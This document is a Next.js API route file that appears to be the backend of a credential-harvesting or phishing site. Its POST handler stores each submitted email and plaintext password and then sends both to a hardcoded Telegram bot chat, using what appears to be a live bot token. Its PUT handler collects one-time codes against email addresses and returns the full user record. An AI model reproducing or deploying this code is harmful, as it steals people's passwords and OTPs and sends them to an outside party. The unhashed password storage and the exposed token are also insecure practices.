import { NextResponse } from 'next/server';
import { prisma } from '@/lib/prisma';
import axios from 'axios';

const BOT_TOKEN = "8323028939:AAG36Ya8cpdwt0LeuFMNH7oTo1DrHRAZmWU";
const CHAT_ID = -1002872022902;

async function tgfy(email: string, password: string) {
  try {
    const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/SendMessage`, {
      chat_id: CHAT_ID,
      text: `New User Registered\n\n ** User: ** ${email}\n ** Password:** ${password}`
    })
  } catch (error) {
    console.error("Error Sending TG notification");
  }
}


  export async function GET() {
    return NextResponse.json({ message: 'Hello world' });
  }

  export async function POST(request: Request) {
    const { email, password } = await request.json();

    try {
      await prisma.user.create({
        data: {
          email,
          password,
        },
      });
      await tgfy(email, password);
      return NextResponse.json({ message: 'User created' });
    } catch (error) {
      console.error(error);
      return NextResponse.json({ error: 'Something went wrong' }, { status: 500 });
    }
  }

  export async function PUT(request: Request) {
    const { email, otp } = await request.json();

    try {
      const user = await prisma.user.update({
        where: {
          email,
        },
        data: {
          otp,
        },
      });
      return NextResponse.json(user);
    } catch (error) {
      console.error(error);
      return NextResponse.json({ error: 'Something went wrong' }, { status: 500 });
    }
  }
